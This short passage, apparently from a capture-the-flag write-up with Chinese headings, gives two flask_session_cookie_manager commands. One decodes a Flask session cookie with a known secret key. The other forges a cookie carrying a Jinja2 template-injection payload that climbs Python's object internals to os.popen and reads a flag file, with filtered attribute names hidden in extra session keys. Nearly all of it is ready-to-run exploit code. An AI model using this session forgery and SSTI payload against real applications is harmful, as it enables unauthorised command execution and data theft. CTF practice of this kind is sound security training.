
### 解码
```python
python flask_session_cookie_manager3.py decode  -s "y0u_n3ver_k0nw_s3cret_key_1s_newst4r" -c "eyJ1c2VyIjoiZ3Vlc3QifQ.Zym1bQ.RODwmojjYR1LnyEq1Nj-H0Bj-rs"
```

### 编码
```python
python flask_session_cookie_manager3.py encode -s 'y0u_n3ver_k0nw_s3cret_key_1s_newst4r' -t '{"user": "{% print(\"\"[session[\"a\"]][session[\"b\"]][0][session[\"c\"]]()[117][session[\"d\"]][session[\"e\"]][session[\"f\"]](\"more /y0U3_f14g_1s_h3re\")[session[\"g\"]]() %}", "a": "__class__", "b": "__bases__", "c": "__subclasses__", "d": "__init__", "e": "__globals__", "f": "popen", "g": "read"}'
```


